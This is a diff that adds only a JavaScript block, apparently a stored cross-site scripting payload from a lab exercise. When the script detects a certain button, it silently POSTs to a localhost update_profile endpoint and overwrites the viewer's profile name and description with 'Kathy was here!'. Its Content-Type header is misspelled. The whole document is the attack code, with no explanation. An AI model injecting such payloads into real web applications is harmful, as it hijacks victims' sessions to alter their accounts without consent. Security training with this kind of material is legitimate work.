@@ -1,0 +1,13 @@
+<script>
+if (document.getElementsByClassName("btn btn-primary btn-sm pull-right").length != 0) {
+	var xhr=null;
+	xhr = new XMLHttpRequest();
+	xhr.open("POST", "http://localhost:5000/update_profile", false);
+	xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
+	xhr.setRequestHeader("Content-Type", "application/x-www-foorrm-urlencoded");
+	xhr.setRequestHeader("Upgrade-Insecure-Requests", "1");
+	xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+	var content = "full_name=Bob Reed&description=Kathy was here!";
+	xhr.send(content);
+}
+</script>
